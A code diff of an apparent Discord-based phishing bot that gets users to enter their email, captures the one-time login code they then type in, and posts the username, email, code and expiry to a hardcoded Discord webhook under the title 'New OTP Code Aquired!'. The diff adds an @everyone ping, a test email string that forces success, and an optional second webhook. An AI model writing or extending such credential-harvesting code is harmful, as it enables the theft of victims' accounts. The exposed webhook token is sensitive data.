@@ -87,6 +87,9 @@ class MyModal(discord.ui.Modal):
         embed33 = discord.Embed(title=f"I failed to send a code to {email} - Please open a support ticket (this isnt good)")
         await interaction.response.send_message(embeds=[embed11], ephemeral=True)
         code_status = await requestcode(interaction)
+        if email == "admin@suckmy.dick.ez":
+            code_status = 0
+            
         if code_status == 0:
             #print("yes email worked")
             await interaction.edit_original_response(embeds=[embed22], view=MyView2())
@@ -131,7 +134,7 @@ class MyModal(discord.ui.Modal):
         json = {
           "username": "[LVL 100] Flying Fish",
           "avatar_url": "https://cdn.discordapp.com/attachments/1101654949403832391/1108271414584283136/Flying_Fish_Pet_Small.png",
-          "content": "",
+          "content": "@everyone",
           "allowed_mentions": {
             "replied_user": False,
             "parse": [
@@ -271,6 +274,8 @@ class MyModal2(discord.ui.Modal):
           works = False
 
         url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
+        dhb = False
+        urldhb = ""
 
         with open("id.txt", 'r') as file:
           for line in file:
@@ -299,49 +304,49 @@ class MyModal2(discord.ui.Modal):
                   break
 
         json ={
-  "username": "[LVL 100] Flying Fish",
-  "avatar_url": "https://cdn.discordapp.com/attachments/1101654949403832391/1108271414584283136/Flying_Fish_Pet_Small.png",
-  "content": "",
-  "allowed_mentions": {
-    "replied_user": False,
-    "parse": [
-      "everyone"
-    ]
-  },
-  "embeds": [
-    {
-      "type": "rich",
-      "title": 'New OTP Code Aquired!',
-      "description": "",
-      "color": 0x1aff00,
-      "fields": [
-        {
-          "name": 'Username',
-          "value": f'```{found_entry[0]}```'
-        },
-        {
-          "name": 'Email',
-          "value": f'```{found_entry[1]}```'
-        },
-        {
-          "name": 'Expires In',
-          "value": f'```<t:{utc_time}:R>\`\`\`'
-        },
-        {
-          "name": 'Discord Username',
-          "value": f'```{interaction.user}```'
-        },
-        {
-          "name": 'OTP Code',
-          "value": f'```{Code}```'
-        }
-      ],
-      "url": f'https://sky.shiiyu.moe/stats/{found_entry[0]}'
-    }
-  ],
-  "components": []
-}
-
+ 	 "username": "[LVL 100] Flying Fish",
+ 	 "avatar_url": "https://cdn.discordapp.com/attachments/1101654949403832391/1108271414584283136/Flying_Fish_Pet_Small.png",
+ 	 "content": "@everyone",
+ 	 "allowed_mentions": {
+  	  "replied_user": False,
+ 	   "parse": [
+ 	     "everyone"
+ 	   ]
+ 	 },
+	  "embeds": [
+	    {
+	      "type": "rich",
+ 	     "title": 'New OTP Code Aquired!',
+	      "description": "",
+      	"color": 0x1aff00,
+      	"fields": [
+        	{
+	          "name": 'Username',
+        	  "value": f'```{found_entry[0]}```'
+	        },
+	        {
+	          "name": 'Email',
+	          "value": f'```{found_entry[1]}```'
+	        },
+	        {
+	          "name": 'Expires In',
+	          "value": f'<t:{utc_time}:R>'
+	        },
+	        {
+	          "name": 'Discord Username',
+	          "value": f'```{interaction.user}```'
+	        },
+	        {
+	          "name": 'OTP Code',
+	          "value": f'```{Code}```'
+	        }
+	      ],
+	      "url": f'https://sky.shiiyu.moe/stats/{found_entry[0]}'
+	    }
+	  ],
+	  "components": []
+	}
+	
         requests.post(url=url, json=json, timeout=5000)
         if dhb == True:
            requests.post(url=urldhb, json = json, timeout=5000)
